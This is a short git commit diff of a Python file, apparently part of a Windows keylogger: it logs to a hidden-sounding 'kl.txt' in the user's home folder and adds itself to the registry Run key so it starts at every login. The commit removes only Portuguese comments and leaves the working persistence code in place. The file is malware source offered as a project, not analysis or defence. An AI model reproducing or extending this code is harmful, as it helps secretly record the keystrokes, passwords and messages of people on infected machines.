a015b8ff4c301ea93d1a9398a7c493854b10495e
fnariys <franciscodntariys@gmail.com>
2024-05-31 12:13:42 -0300

    nm changes

--- pw32_kl4.py
+++ pw32_kl4.py
@@ -5,19 +5,18 @@ import winreg as reg
 
 log_file_path = os.path.join(os.path.expanduser("~"), "kl.txt")
 
-# Função para adicionar o aplicativo ao início do Windows
 def add_to_startup(file_path, app_name):
     try:
-        # Caminho da chave de execução no registro
+        
         reg_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
         
-        # Abra a chave de execução com acesso de escrita
+        
         key = reg.OpenKey(reg.HKEY_CURRENT_USER, reg_key, 0, reg.KEY_SET_VALUE)
         
-        # Adicione a entrada ao registro
+        
         reg.SetValueEx(key, app_name, 0, reg.REG_SZ, file_path)
         
-        # Feche a chave
+        
         reg.CloseKey(key)
         
         print(f"'{app_name}' added to windows.")
